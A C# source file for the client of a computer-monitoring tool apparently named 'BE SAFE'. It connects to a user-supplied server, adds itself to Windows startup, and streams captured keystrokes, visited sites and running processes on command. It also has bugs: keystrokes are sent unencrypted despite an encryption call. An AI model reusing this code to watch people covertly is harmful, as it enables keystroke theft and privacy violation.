using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using IWshRuntimeLibrary; 
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Reflection; 
using System.Runtime.InteropServices; 
using iTextSharp.text.pdf;
using iTextSharp.text; 

namespace ClientSide
{

    public delegate void wordFromKeylogger(string word);
    public delegate void SiteFromMonitorSite(string word);
    public delegate void updateProccess(string proccess);
    class Program
    {

        const string ID = "id";
        const string SETTING = "setting";
        const string LIVE = "start live mode";
        const string STOP_LIVE = "stop current state";
        const string REMOVE_CLIENT = "remove client";
        const string LAST_REPORT = "last report";

        private String id;
        private Socket clientSocket;
        private String name;
        private String ip;
        private Byte[] buffer;
        private DBclient dbc;
        private Setting set;
        private ClientForm clientForm;
        public Boolean sendCurrentData;
        string keyDate;
        public static Program program;
        ManageMonitor manageMonitor;
        private static bool checkConnection;
        static Mutex mutex = new Mutex(true, "{8F6F0AC4-B9A1-45fd-A8CF-72F04E6BDE8F}");



        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
        //     if (mutex.WaitOne(TimeSpan.Zero, true))
        //    {

                CreateShortcut("BSA-Client", Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Assembly.GetExecutingAssembly().Location);
                program = new Program();
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);


                // check if connect at first time or reconnect         
                if (!program.connectToExistClient())
                {
                    program.connectToServer();
                }
             Thread interntAvilable = new Thread(checkConnections);
             interntAvilable.Start();
            Application.Run();
            //    mutex.ReleaseMutex();
            //}
            //else
            //{
            //    // send our Win32 message to make the currently running instance
            //    // jump on top of all the other windows
            //    NativeMethods.PostMessage((IntPtr)NativeMethods.HWND_BROADCAST,
            //        NativeMethods.WM_SHOWME,
            //        IntPtr.Zero,
            //        IntPtr.Zero);
            //}


            // sqliteForm sf = new sqliteForm();
            // sf.ShowDialog();


        }
        public static void CreateShortcut(string shortcutName, string shortcutPath, string targetFileLocation)
        {
             
            string projectDirectory = Environment.CurrentDirectory;
            string path = Directory.GetParent(projectDirectory).Parent.FullName;
            string userName = Environment.UserName;
            string shortcutLocation = System.IO.Path.Combine(shortcutPath, shortcutName + ".lnk");
            WshShell shell = new WshShell();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);

            shortcut.Description = "BE SAFE CLIENT SIDE ";   // The description of the shortcut
            shortcut.IconLocation = path + "/besafe-server-icon.ico"; // The icon of the shortcut
            shortcut.TargetPath = targetFileLocation;                 // The path of the file that will launch when the shortcut is run
            shortcut.Save();                                    // Save the shortcut
        }
        private static void checkConnections()
        {
            while (true)
            {

                if (checkInterntConnection())
                {
                    if(!checkSocketConnections())
                    {
                        Console.WriteLine("checkSocketConnections false - RECONNECT");
                        program.reConnect();
                    }

                }
                else {
                    try
                    {
                        Console.WriteLine("SEND TO CLIENT NO INTERNET");
                        string crypto = Crypto.Encrypt("NO_INTERNET\r");
                        string decrypto = Crypto.Decrypt(crypto);
                        var sendData = Encoding.UTF8.GetBytes(crypto);
                        program.clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, program.SendCallback, program.clientSocket);


                    }
                    catch (Exception ex)
                    {
                        // ShowErrorDialog("checkSocketConnections: \n" + ex.Message + " \n\n" + ex);
                        Console.WriteLine("FAIL SEND TO CLIENT NO INTERNET");
                        program.reConnect();   

                    }
                }

                Thread.Sleep(5000); 


            } 
        }
        private static bool checkSocketConnections()
        {
            try
            {
                if (program.clientSocket == null)
                {
                    return false;
                }
                string crypto = Crypto.Encrypt("client check connection");
                string decrypto = Crypto.Decrypt(crypto);
                var sendData = Encoding.UTF8.GetBytes(crypto);
                program.clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, program.SendCallback, program.clientSocket);
                return true;

            }
            catch (SocketException ex)
            {
                // ShowErrorDialog("checkSocketConnections: \n" + ex.Message + " \n\n" + ex);
               
                program.manageMonitor.stopLiveMode();              
                return false;

            }
        }

        public static bool checkInterntConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;

                }
            }
            catch
            {
                // send client not internet

                return false;
            }


            //while (true)
            //{

            //    try
            //    {

            //        string crypto = Crypto.Encrypt("check connection");
            //        string decrypto = Crypto.Decrypt(crypto);                  
            //        var sendData = Encoding.UTF8.GetBytes(crypto);
            //        program.clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, program.SendCallback, program.clientSocket);


            //    }
            //    catch(Exception ex)
            //    {
            //        // ShowErrorDialog("checkInterntConnection: \n" + ex.Message + " \n\n" + ex);
            //        Console.WriteLine("checkInterntConnection RECONNECT");
            //        program.reConnect();

            //    }


            //}

            //Console.WriteLine("exit thread check internet");
        }

        private static void connectAtReStartComputer()
        {
            // The path to the key where Windows looks for startup applications
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            WshShell shell = new WshShell();
            string shortcutAddress = startupFolder + @"\MyStartupShortcut.lnk";
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
            shortcut.Description = "A startup shortcut. If you delete this shortcut from your computer, LaunchOnStartup.exe will not launch on Windows Startup"; // set the description of the shortcut
            shortcut.WorkingDirectory = Application.StartupPath; /* working directory */
            shortcut.TargetPath = Application.ExecutablePath; /* path of the executable */
            shortcut.Save(); // save the shortcut 
            shortcut.Arguments = "/a /c";


            // if (rkApp.GetValue("ClientSide.exe") == null) { }
            // Remove the value from the registry so that the application doesn't start
            //  else 
            //  rkApp.DeleteValue("ClientSide.exe", false);

        }

        // The function is activated as soon as data is received in the socket
        private void ReceiveCallback(IAsyncResult AR)
        {

            try
            {
                clientSocket = AR.AsyncState as Socket;
                int received = clientSocket.EndReceive(AR);
                if (received == 0)
                {
                    return;
                }

                string data = Encoding.ASCII.GetString(buffer);

                var dataFromServer = data.Split(new[] { '\r', '\n', '\0' }, 2);

                DBclient DBInstance = DBclient.Instance;

                switch (dataFromServer[0])// dddd 
                {
                    // Get uniqe id 
                    case ID:
                        id = dataFromServer[1].Split('\r', '\n', '\0')[0];
                        DBInstance.fillGeneralDetailsTable("id", id);
                        //ShowErrorDialog("get id");  
                        break;

                    // Get Setting to implement monitoring gg 
                    case SETTING:
                        string setting = dataFromServer[1].Split('\0')[0];
                        setting = setting.Substring(setting.IndexOf("\n") + 1);
                       
                        // save setting 
                        DBInstance.fillGeneralDetailsTable("setting", setting);
                        playAllTrigers(); //This method obtains the settings string from the server  

                        // Set Periodic Report
                        // PeriodicReporting.setReportPeriodic();

                        break;

                    // Launch the software in live reporting mode
                    case LIVE:
                        liveMode(clientSocket); 
                        break;

                    // Stop live reporting mode 
                    case STOP_LIVE:
                        // ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");  
                        stopLiveMode(clientSocket);
                        break;

                    // Stop live reporting mode
                    case LAST_REPORT:
                        sendLastReport(clientSocket);
                        break;

                    // Remove computer from monitoring
                    case REMOVE_CLIENT:
                        removeClient();
                        break;

                    default:
                        // ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
                        break;
                }

                buffer = new byte[clientSocket.ReceiveBufferSize];
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);
            }

            catch (SocketException ex)
            {
                //ShowErrorDialog("ReceiveCallback\n" + ex );
                Console.WriteLine("ReceiveCallback SocketException - RECONNECT");
                reConnect();
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("ReceiveCallback ObjectDisposedException\n " + ex.Message + " \n\n" + ex);
               Console.WriteLine("ReceiveCallback ObjectDisposedException");
            }
        }

        private void sendLastReport(Socket socket)
        {

            string lastReport = PeriodicReporting.getReportString();
             
            Console.WriteLine("last reort is: " + lastReport);
            SendData(socket, "check connection before send last report\r");
            SendData(socket, "last report\r" + lastReport);
        }
        // sara 
        private void removeClient()
        { 
            ShowErrorDialog("removeeeeeeeeeeee");
            
            // turn off all theards 
            manageMonitor.stopAllTriggers();
           
            // create last report
            PeriodicReporting.createLastReport();
           
            // db
            // DBclient DBInstance = DBclient.Instance;
            // DBInstance.deleteDB();
                     
            // restart - delete key 
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rkApp.DeleteValue("ClientSide.exe", false);

            // stop theard checkConnection
            checkConnection = false;





        }

        private void stopLiveMode(Socket clientSocket)
        {

            sendCurrentData = false;
            // monitorProccess.ifLive = false; 
            // ShowErrorDialog("stop send current state");   
            manageMonitor.stopLiveMode();
        }

        private void liveMode(Socket socket)
        {
            sendCurrentData = true;
            //SendData(socket, "open live form\r");
            SendData(socket, "current state\ropen CurrentState form");
            manageMonitor.playLiveMode();


        }

        // set setting and here will play all triggers;
        private void playAllTrigers()
        {

            Console.WriteLine("PLAY ALL TRIGGERRS");

            // Play all monitors
            manageMonitor = new ManageMonitor();
            manageMonitor.playAllTriggers();

            // Set Periodic Report
            PeriodicReporting.setReportPeriodic();

            // set daiely report
            PeriodicReporting.setDailyReport();
        }

       
        // Defines functions for sending and receiving data through the socket kill sara 
        private void ConnectCallback(IAsyncResult AR)
        {

            try
            {
                clientSocket = AR.AsyncState as Socket;
                clientSocket.EndConnect(AR);
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);

                // ShowErrorDialog("in ConnectCallback in socket: " + clientSocket.RemoteEndPoint);

                if (id != null)
                {
                    SendData(clientSocket, "id\r" + id);
                }
                   
                else SendData(clientSocket, "name\r" + name);

                // play thread to check connection to server socket
                //if (checkConnection)
                //{
                //    checkConnection = false;                    
                //}


            }
            catch (SocketException ex)
            {
                 Thread.Sleep(5000);
                //ShowErrorDialog("ConnectCallback send SocketException\n" + ex.Message+" \n\n"+ex);
                Console.WriteLine("ConnectCallback send SocketException\n"+ex.Message);

                reConnect();

            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("ConnectCallback send ObjectDisposedException\n" + ex.Message + " \n\n" + ex);
            }
            catch (ArgumentException ex) {
                Console.WriteLine("ConnectCallback ArgumentException");
            }
        }

        // A method that sends information to a server
        private void SendCallback(IAsyncResult AR)
        {
            try
            {
                clientSocket = AR.AsyncState as Socket;
                clientSocket.EndSend(AR);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("SendCallback send SocketException\r\n" + ex.Message + " \n\n" + ex);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("SendCallback send ObjectDisposedException \r\n" + ex.Message + " \n\n" + ex);
            }
            catch (ArgumentException ex) {
                Console.WriteLine("SendCallback ArgumentException");
                ShowErrorDialog("SendCallback send ArgumentException \r\n" + ex.Message + " \n\n" + ex);
            }
        }

        public static void ShowErrorDialog(string message)
        {
            MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
            // Console.WriteLine(message);
        }


        public void connectToServer()
        {
            try
            {

                clientForm = new ClientForm();
                clientForm.Text = "Connecting to monitoring software";
                Thread openClientForm = new Thread(openClientFormDialog);
                openClientForm.SetApartmentState(ApartmentState.STA);
                openClientForm.Start();

                while (openClientForm.IsAlive) ;

                name = clientForm.clientName;
                ip = clientForm.ip;
                DBclient DBInstance = DBclient.Instance;
                DBInstance.fillGeneralDetailsTable("name", name);
                DBInstance.fillGeneralDetailsTable("ip", ip);

                // Create new socket 
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                buffer = new byte[clientSocket.ReceiveBufferSize];

                // Connect To Server 
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                // The function ConnectCallback set callback to receive and send 
                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
                
                // Set up the software that will work when you turn on the computer           
                connectAtReStartComputer();
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("connectToServer send SocketException\r\n"+ ex.Message + " \n\n" + ex);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("connectToServer send ObjectDisposedException\r\n" + ex.Message + " \n\n" + ex);
            }


        }

        public static bool CheckConnection(Socket clientSocket)
        {

            if (internetConnection() && SocketConnected(clientSocket))
                return true;
            else
                return false;
        }

        public static bool SocketConnected(Socket s)
        {
            bool part1 = s.Poll(1000, SelectMode.SelectRead);

            if (part1)
                return false;
            else
                return true;
        }

        public static bool internetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        private bool connectToExistClient()
        {

            DBclient DBInstance = DBclient.Instance;            
            ip = DBInstance.getGeneralDetailsTable("ip");
            string setting  = DBInstance.getGeneralDetailsTable("setting");
            Console.WriteLine("setting: " + setting+"\nip: "+ip);
            if (setting.Length > 0)
            {
                id = DBInstance.getGeneralDetailsTable("id");
                Console.WriteLine("connectToExistClient - RECONNECT");
                reConnect();
                playAllTrigers();

                return true;
            }
            return false;


            //string set = "";
            //string projectDirectory = Environment.CurrentDirectory;
            //string filepath = Directory.GetParent(projectDirectory).Parent.FullName;
            //string[] paths = new string[] { @filepath, "files" };
            //filepath = Path.Combine(paths);

            //DirectoryInfo directory = new DirectoryInfo(filepath);//Assuming Test is your Folder
            ////ShowErrorDialog("filepath is: \n" + filepath);
            //string fileName = "setting_" + Environment.UserName + ".txt";
            //if (Directory.Exists(filepath) && System.IO.File.Exists(Path.Combine(filepath, fileName)))
            //{

            //    using (StreamReader sr = System.IO.File.OpenText(Path.Combine(filepath, fileName)))
            //    {
            //        name = sr.ReadLine();
            //        id = sr.ReadLine();
            //        //ip = "10.0.0.4";
            //        //ip = "127.0.0.1";

            //        DBclient DBInstance = DBclient.Instance;
            //        ip = DBInstance.getGeneralDetailsTable("ip");
            //        ShowErrorDialog("ipppp: " + ip);
            //        string line = "";
            //        while ((line = sr.ReadLine()) != null)
            //        {
            //            //ShowErrorDialog("line\n" + line);
            //            set += line + "\r\n";
            //        }
            //    }
            //    reConnect();
            //    playAllTrigers();

            //    return true;
            //}


            //return false;

        }

        private void openClientFormDialog()
        {
            clientForm.ShowDialog();
        }

        public void SendData(Socket clientSocket, String data) 
        {
            
 
            try
            {
                //if (CheckConnection(clientSocket)) 
                if(clientSocket!=null)
                {
                    string crypto = Crypto.Encrypt(data);
                    string decrypto = Crypto.Decrypt(crypto);
                    Console.WriteLine(crypto +"\n"+decrypto);
                    //ShowErrorDialog("Send: "+ crypto);
                     var sendData = Encoding.UTF8.GetBytes(data);
                    clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);

                   

                }
                else {
                    Console.WriteLine("send data fail, socket disconnection");
                    // reConnect();
                    SendData(clientSocket, data);
                }

            }
            catch (SocketException ex)
            {
                if (!CheckConnection(clientSocket))
                {
                    ShowErrorDialog("send data fail, Socket Exception \r\n" + ex.Message + " \n\n" + ex);
                    // ShowErrorDialog("SendData send SocketException\r\n" + ex.Message);
                    // reConnect();
                    // SendData(clientSocket, data);

                }


                //SendData(clientSocket, data);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("send data fail, ObjectDisposed Exception \r\n" + ex.Message + " \n\n" + ex);
                // ShowErrorDialog("SendData send ObjectDisposedException \r\n" + ex.Message);
                //reConnect();
            }
        }


        //public void sendDataByParts(Socket clientSocket, string data)
        //{
        //    string subject = data.Split(new[] { '\r'}, 2)[0];
        //    string testData = data.Split(new[] { '\r' }, 2).Last();
        //    var sendData = Encoding.UTF8.GetBytes("start send data by parts\r" + subject + "\r");
        //    clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);


        //    string subData = "";
        //    string subEncrypt = "";
        //    int index = 0;
        //    int length = 20;

        //    bool lastPart = false;
        //    while (!lastPart)
        //    {

        //        if ((index + length) > testData.Length)
        //        {
        //            length = testData.Length;
        //            subData += testData.Substring(index, length);
        //            lastPart = true;
        //        }
        //        else
        //        {
        //            subData += testData.Substring(index, index + length);
        //        }


        //        Byte[] subStringByte = Encoding.UTF8.GetBytes(testData);

        //        subEncrypt = Crypto.Encryption(subData);
        //        if (subEncrypt != string.Empty)
        //        {
        //            DBclient DBInstance = DBclient.Instance;
        //            string id = DBInstance.getGeneralDetailsTable("id");

        //            sendData = Encoding.UTF8.GetBytes("sub encrypt data\r" + id + "\r" + subEncrypt);
        //            clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);
        //            index += length;
        //            length += 20;
        //        }



        //    } 


        //    sendData = Encoding.UTF8.GetBytes("stop send data by parts\r" + id + "\r");
        //    clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);


        //}

         

        public void reConnect()
        {
            try
            {
                if (checkSocketConnections()) {
                    return;

                }
                // Create new socket 
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                buffer = new byte[clientSocket.ReceiveBufferSize];

                //ShowErrorDialog("reConnect in socket: " + clientSocket.RemoteEndPoint);
                // Connect To Server 
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                // The function ConnectCallback set callback to receive and send 
                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);

                // send to server alert who missing 
                DBclient DBInstance = DBclient.Instance;
                string immadiateAlerts = DBInstance.getReportImmediateTable();
                if (immadiateAlerts.Length > 0)
                {
                    PeriodicReporting.sendMissingReportsToMail(immadiateAlerts);
                }


                
            }
            catch (SocketException ex) 
            {
                ShowErrorDialog("reConnect send SocketException\r\n" + ex.Message + " \n\n" + ex);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("reConnect send ObjectDisposedException \r\n" + ex.Message + " \n\n" + ex);
            }
            catch (InvalidOperationException ex) {
                ShowErrorDialog("reConnect send InvalidOperationException \r\n" + ex.Message + " \n\n" + ex);
            }
        }

        public static void updateCurrentKeylogger(string word)
        {

            //ShowErrorDialog(word);
            program.SendData(program.clientSocket, "current state\rkeyBoard\r" + word);


        }

        public static void updateCurrentSite(string site)
        {
            // ShowErrorDialog("send site: \n"+site);
            //Console.WriteLine(site); 
            program.SendData(program.clientSocket, "current state\rsite\r" + site);



        }

        public static void updateCurrentProcess(string proccess)
        {
            // ShowErrorDialog("send proc: \n" + proccess);
            program.SendData(program.clientSocket, "current state\rprocesses\r" + proccess);



        }


    }
}

